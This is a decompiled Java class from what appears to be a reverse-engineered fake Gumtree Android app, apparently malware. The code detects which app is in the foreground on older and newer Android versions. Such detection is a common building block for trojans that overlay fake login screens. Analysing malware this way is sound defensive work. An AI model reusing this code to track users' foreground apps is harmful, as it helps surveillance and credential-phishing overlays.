package com.gumsis.checktls;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.os.Build.VERSION;
import java.util.List;

public class PkgTls
{
  public static String getActivity(ActivityManager paramActivityManager)
  {
    try
    {
      if (Build.VERSION.SDK_INT >= 21) {
        return getActivityAfterLolipop(paramActivityManager);
      }
      paramActivityManager = getActivityBeforeLolipop(paramActivityManager);
      return paramActivityManager;
    }
    catch (Exception paramActivityManager)
    {
      paramActivityManager.printStackTrace();
    }
    return "";
  }
  
  private static String getActivityAfterLolipop(ActivityManager paramActivityManager)
    throws Exception
  {
    return ((ActivityManager.RunningAppProcessInfo)paramActivityManager.getRunningAppProcesses().get(0)).processName;
  }
  
  private static String getActivityBeforeLolipop(ActivityManager paramActivityManager)
    throws Exception
  {
    return ((ActivityManager.RunningTaskInfo)paramActivityManager.getRunningTasks(1).get(0)).topActivity.getPackageName();
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/PkgTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */